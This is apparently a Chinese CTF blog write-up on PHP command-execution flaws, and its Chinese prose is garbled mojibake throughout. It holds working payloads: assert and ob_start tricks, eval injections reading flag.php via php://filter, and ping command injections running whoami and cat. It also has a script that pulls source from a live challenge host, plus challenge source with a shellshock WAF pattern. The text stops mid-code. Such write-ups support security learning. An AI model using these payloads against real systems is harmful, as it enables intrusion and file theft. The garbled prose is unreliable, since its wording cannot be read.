<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
<h4 id="ob-start">ob_start()</h4>
<p>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</p>
<p>å‡½æ•°æè¿°ï¼šæ­¤å‡½æ•°å°†æ‰“å¼€è¾“å‡ºç¼“å†²ã€‚å½“è¾“å‡ºç¼“å†²æ¿€æ´»åï¼Œè„šæœ¬å°†ä¸ä¼šè¾“å‡ºå†…å®¹ï¼ˆé™¤httpæ ‡å¤´å¤–ï¼‰ï¼Œç›¸åéœ€è¦è¾“å‡ºçš„å†…å®¹è¢«å­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­ã€‚</p>
<p>å†…éƒ¨ç¼“å†²åŒºçš„å†…å®¹å¯ä»¥ç”¨ ob_get_contents() å‡½æ•°å¤åˆ¶åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ä¸­ã€‚ æƒ³è¦è¾“å‡ºå­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ ob_end_flush() å‡½æ•°ã€‚å¦å¤–ï¼Œ ä½¿ç”¨ ob_end_clean() å‡½æ•°ä¼šé™é»˜ä¸¢å¼ƒæ‰ç¼“å†²åŒºçš„å†…å®¹ã€‚</p>
<p>æ¯”å¦‚æœ‰å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$key = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">ob_start($key);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ls -al&#x27;</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="comment"># -rw-râ€“râ€“ 1 root root    0 Mar 12 06:46 tets</span></span><br></pre></td></tr></table></figure>
<p>å› ä¸ºè¿™é‡Œçš„$skyè¢«ä½œä¸ºè¾“å‡ºçš„å›è°ƒå‡½æ•°ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„<code>ls -al</code>åœ¨ç¼“å†²åŒºï¼Œç»è¿‡ob_end_flush()è¾“å‡ºç¼“å†²åŒºåï¼Œå¯ä»¥å¾—åˆ°<code>system('ls -al')</code>ï¼Œè¿™æ ·çš„æ“ä½œï¼Œæ‰€ä»¥æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ã€‚</p>
<h2 id="ä»CTFçœ‹å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨">ä»CTFçœ‹å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨</h2>
<h3 id="bugku-æœ¬åœ°åŒ…å«">bugku æœ¬åœ°åŒ…å«</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200107201708.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æ‰“å¼€çœ‹åˆ°ä»£ç ï¼Œä¸¤ä¸ªè¦æ³¨æ„çš„ç‚¹</p>
<ul>
<li>$a = @<em>a</em>=@_REQUEST[â€˜helloâ€™];</li>
<li>eval( â€œvar_dump($a);â€);</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190702122901351.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç¬¬ä¸€ä¸ªçš„æ„æ€å°±æ˜¯ä¸ç®¡ä½ æ˜¯postè¿˜æ˜¯getä¼ å‚ï¼Œrequestéƒ½èƒ½è·å–åˆ°helloçš„å€¼<br>
ç¬¬äºŒä¸ªçœ‹åˆ°eval()å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œevalå¯ä»¥æ‰§è¡Œæ‹¬å·å†…çš„phpå‘½ä»¤</p>
<p>å¦‚æœå¯ä»¥æ„é€ ä¸€äº›å¯æ‰§è¡Œçš„phpä»£ç ï¼Œåˆ™evalå°±ä¼šå…¨éƒ¨æ‰§è¡Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello&#x3D;);print_r(file(â€œflag.phpâ€)</span><br><span class="line"></span><br><span class="line">hello&#x3D;);var_dump(file(â€œflag.phpâ€)</span><br><span class="line"></span><br><span class="line">hello&#x3D;file(â€œflag.phpâ€)</span><br><span class="line"></span><br><span class="line">hello&#x3D;file_get_contents(â€˜flag.phpâ€™)</span><br><span class="line"></span><br><span class="line">hello&#x3D;);include(@$_POST[â€˜bâ€™]</span><br><span class="line"></span><br><span class="line">- åœ¨POSTåŒºåŸŸï¼šb&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">hello&#x3D;);include(â€œphp:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpâ€</span><br><span class="line"></span><br><span class="line">hello&#x3D;1);show_source(â€˜flag.phpâ€™);var_dump(</span><br><span class="line"></span><br><span class="line">hello&#x3D;1);show_source(%27flag.php%27);var_dump(3</span><br></pre></td></tr></table></figure>
<p>åˆ†åˆ«ä¼šæœ‰ä»€ä¹ˆæ ·çš„ç»“æœå‘¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval( â€œvar_dump();print_r(file(â€œflag.phpâ€));â€);</span><br><span class="line"></span><br><span class="line">eval( â€œvar_dump();var_dump(file(â€œflag.phpâ€));â€);</span><br><span class="line"></span><br><span class="line">eval( â€œvar_dump(file(â€œflag.phpâ€));â€);</span><br><span class="line"></span><br><span class="line">eval( â€œvar_dump(file_get_contents(â€˜flag.phpâ€™));â€);</span><br><span class="line"></span><br><span class="line">eval( â€œvar_dump();include(@$_POST[â€˜bâ€™]);â€);</span><br><span class="line"></span><br><span class="line">eval( â€œvar_dump();include(â€œphp:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpâ€);â€);</span><br><span class="line"></span><br><span class="line">- b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">eval( â€œvar_dump(1);show_source(â€˜flag.phpâ€™);var_dump();â€);</span><br><span class="line"></span><br><span class="line">eval( â€œvar_dump(1);show_source(%27flag.php%27);var_dump(3);â€);</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆéƒ½å¯ä»¥get flagã€‚</p>
<ul>
<li>eval() å‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ„é€ å‡ºæ–‡ä»¶åŒ…å«ä¼šæŠŠå­—ç¬¦ä¸²å‚æ•°å½“åšä»£ç æ¥æ‰§è¡Œã€‚</li>
<li>file() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œå¹¶å°†æ–‡ä»¶ä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ã€‚</li>
<li>print_r() å‡½æ•°åªç”¨äºè¾“å‡ºæ•°ç»„ã€‚</li>
<li>var_dump() å‡½æ•°å¯ä»¥è¾“å‡ºä»»ä½•å†…å®¹ï¼šè¾“å‡ºå˜é‡çš„å®¹ï¼Œç±»å‹æˆ–å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œç±»å‹ï¼Œé•¿åº¦ã€‚</li>
<li>hello=file(â€œflag.phpâ€)ï¼Œæœ€ç»ˆä¼šå¾—åˆ°var_dump(file(â€œflag.phpâ€))ï¼Œä»¥æ•°ç»„å½¢å¼è¾“å‡ºæ–‡ä»¶å†…å®¹ã€‚</li>
<li>include()å‡½æ•°å’Œphp://inputï¼Œphp://filterç»“åˆå¾ˆå¥½ç”¨ï¼Œphp://filterå¯ä»¥ç”¨ä¸è¯»å–æ–‡ä»¶æºä»£ç ï¼Œç»“æœæ˜¯æºä»£ç base64ç¼–ç åçš„ç»“æœã€‚</li>
</ul>
<h3 id="æ”»é˜²ä¸–ç•Œ-command-execution">æ”»é˜²ä¸–ç•Œ command execution</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200107202854.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>pingä¸€ä¸ª 127.0.0.1 | ls â€¦/â€¦/â€¦/home<br>
åªæ‰§è¡Œåé¢åŠå¥ï¼Œçœ‹åˆ°â€¦/â€¦/â€¦/homeç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå°±çœ‹åˆ°äº†flag.txt</p>
<p>æŸ¥çœ‹flag.txt ç”¨catå‘½ä»¤ 127.0.0.1 | cat â€¦/â€¦/â€¦/home/flag.txt<br>
å°±å¯ä»¥get flag</p>
<blockquote>
<p>Windowsï¼š</p>
<p>| ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ ping 127.0.0.1|whoami<br>
|| å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡ ping 2 || whoami<br>
&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>
&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p>
<p>Linuxï¼š</p>
<p>| ç®¡é“ç¬¦ï¼Œæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœ ping 127.0.0.1|whoami<br>
|| å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„ ping 1||whoami<br>
&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>
&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p>
</blockquote>
<h3 id="hackme-command-executor">hackme command executor</h3>
<p>é¢˜ç›®åœ°å€ï¼š<a href="https://command-executor.hackme.inndy.tw/index.php">command-executor</a>â€”â€”æ¥æºäº <a href="https://hackme.inndy.tw/">HackMe</a></p>
<p>é¢˜ç›®æ¶‰åŠåˆ°çš„è€ƒå¯Ÿç‚¹ï¼š</p>
<ol>
<li>æ–‡ä»¶åŒ…å«è¯»æºç </li>
<li>ä»£ç åˆ†æï¼ˆPHPï¼ŒCï¼‰</li>
<li>CVE shellshock</li>
<li>åå¼¹shell</li>
<li>Linuxä¸‹è¾“å‡ºè¾“å…¥é‡å®šå‘</li>
</ol>
<p>é¦–å…ˆé¢˜ç›®æä¾›äº†å‡ ä¸ªæ¨¡å—ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>man</code>å‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110121849.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>é€‰æ‹©äº†<code>bash</code>å‚æ•°å‘ç°å¤šäº†ä¸€ä¸ª<code>file=bash</code>çš„è¯·æ±‚å‚æ•°ï¼Œå°è¯•ä½¿ç”¨å…¶ä»–å‘½ä»¤ï¼Œæ¯”å¦‚ï¼š<code>pwd</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110122148.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>çŒœæµ‹<code>eval(&quot;man /bin/&quot; + command)</code>æˆ–è€…ä¸€äº›å…¶ä»–çš„ç›®å½•ã€‚</p>
<p>Tar Testerç•Œé¢å¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…ä½†æ˜¯å¹¶æ²¡æœ‰è§£å‹ï¼Œåªæ˜¯<code>tar -tvf test.tar</code>æŸ¥çœ‹å‹ç¼©åŒ…å†…çš„å†…å®¹ã€‚</p>
<p>Cmd Execåªèƒ½æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ï¼š<code>ls</code>ã€<code>env</code>ã€‚</p>
<p>List Fileså¯ä»¥åˆ—ä¸¾å‡ ä¸ªç›®å½•ã€‚</p>
<p>å†è§‚å¯Ÿé¢˜ç›®urlçš„å½¢å¼ï¼š<code>https://command-executor.hackme.inndy.tw/index.php?func=untar</code>ç­‰å‡å¸¦æœ‰<code>func=xxx</code>å‚æ•°æ¥å±•ç¤ºé¡µé¢ï¼ŒçŒœæµ‹ä¼šæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°è¯•ä½¿ç”¨<code>func=php://filter/read=convert.base64-encode/resource=index</code>è¯»å–æ–‡ä»¶å†…å®¹ï¼ŒæˆåŠŸå¾—åˆ°å›æ˜¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110122806.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬åˆ†åˆ«æŠŠä¸»é¡µå’Œå…¶ä»–å››ä¸ªæ¨¡å—çš„PHPæºç ä¸‹è½½ä¸‹æ¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=&quot;</span></span><br><span class="line">file_list = [<span class="string">&quot;index&quot;</span>,<span class="string">&quot;man&quot;</span>,<span class="string">&quot;untar&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">    res = requests.get(url+i)</span><br><span class="line">    print(<span class="string">&quot;dowload &quot;</span>+i)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        res.encoding=<span class="string">&quot;utf8&quot;</span></span><br><span class="line">    <span class="keyword">with</span> codecs.open(i+<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;w+&quot;</span>,<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        print(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        text = BeautifulSoup(res.text,<span class="string">&quot;lxml&quot;</span>).text.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        handle.write(base64.b64decode(text).decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">&#x27;man&#x27;</span>, <span class="string">&#x27;Man&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;untar&#x27;</span>, <span class="string">&#x27;Tar Tester&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;Cmd Exec&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;List files&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params">$msg</span>) </span>&#123;</span><br><span class="line">    header(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">&#x27;\/flag&#x27;</span>, <span class="string">&#x27;\(\)\s*\&#123;\s*:;\s*\&#125;;&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$b</span>/&quot;</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">&quot;<span class="subst">$b</span> detected! exit now.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$cmd, $shell=<span class="string">&#x27;bash&#x27;</span></span>) </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">&#x27;%s -c %s&#x27;</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">&#x27;HTTP_&#x27;</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$val</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;func&#x27;</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_default</span>(<span class="params"></span>) </span>&#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;Welcome to <span class="keyword">use</span> <span class="title">our</span> <span class="title">developer</span> <span class="title">assistant</span> <span class="title">service</span>. <span class="title">We</span> <span class="title">provide</span> <span class="title">servial</span> <span class="title">useless</span> <span class="title">features</span> <span class="title">to</span> <span class="title">make</span> <span class="title">your</span> <span class="title">developing</span> <span class="title">life</span> <span class="title">harder</span>.&lt;/<span class="title">p</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">windows</span>-<span class="title">run</span>.<span class="title">jpg</span>&quot; <span class="title">alt</span>=&quot;<span class="title">command</span> <span class="title">executor</span>&quot;&gt;</span><br><span class="line">&lt;?<span class="title">php</span> &#125;</span><br><span class="line">?&gt;&lt;!<span class="title">DOCTYPE</span> <span class="title">html</span>&gt;</span><br><span class="line">&lt;<span class="title">html</span> <span class="title">lang</span>=&quot;<span class="title">en</span>&quot;&gt;</span><br><span class="line">  &lt;<span class="title">head</span>&gt;</span><br><span class="line">    &lt;<span class="title">meta</span> <span class="title">charset</span>=&quot;<span class="title">UTF</span>-8&quot;&gt;</span><br><span class="line">    &lt;<span class="title">title</span>&gt;<span class="title">Command</span> <span class="title">Executor</span>&lt;/<span class="title">title</span>&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">stylesheet</span>&quot; <span class="title">href</span>=&quot;<span class="title">bootstrap</span>/<span class="title">css</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">css</span>&quot; <span class="title">media</span>=&quot;<span class="title">all</span>&quot;&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">stylesheet</span>&quot; <span class="title">href</span>=&quot;<span class="title">comic</span>-<span class="title">neue</span>/<span class="title">font</span>.<span class="title">css</span>&quot; <span class="title">media</span>=&quot;<span class="title">all</span>&quot;&gt;</span><br><span class="line">    &lt;<span class="title">style</span>&gt;</span><br><span class="line">      <span class="title">nav</span> &#123; <span class="title">margin</span>-<span class="title">bottom</span>: 1<span class="title">rem</span>; &#125;</span><br><span class="line">      img &#123; max-width: <span class="number">100</span>%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($pages <span class="keyword">as</span> <span class="keyword">list</span>($file, $title)): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">          &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>; <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&#x27;render&#x27;)) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>man.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $file = <span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        $file = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[\w\-]+$/&#x27;</span>, $file) !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Invalid file name!&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Online documents&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    $cmds = [</span><br><span class="line">        <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;mv&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($cmds <span class="keyword">as</span> $cmd) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=man&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;</span>, $cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&#x27;&lt;h2&gt;$ man %s&lt;/h2&gt;&#x27;</span>, htmlentities($file));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    execute(sprintf(<span class="string">&#x27;man %s | cat&#x27;</span>, escapeshellarg($file)));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>untar.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;Tar file tester&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Please upload a tar file to test&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;index.php?func=untar&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tarfile&quot;</span> id=<span class="string">&quot;tarfile&quot;</span>&gt;</span><br><span class="line">  &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Upload &amp;amp; Test&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;tarfile&#x27;</span>])) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;&#x27;</span>, htmlentities($_FILES[<span class="string">&#x27;tarfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        execute(sprintf(<span class="string">&#x27;tar -tvf %s 2&gt;&amp;1&#x27;</span>, escapeshellarg($_FILES[<span class="string">&#x27;tarfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>cmd.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        $cmd = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;Command Execution&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    $cmds = [<span class="string">&#x27;ls&#x27;</span>, <span 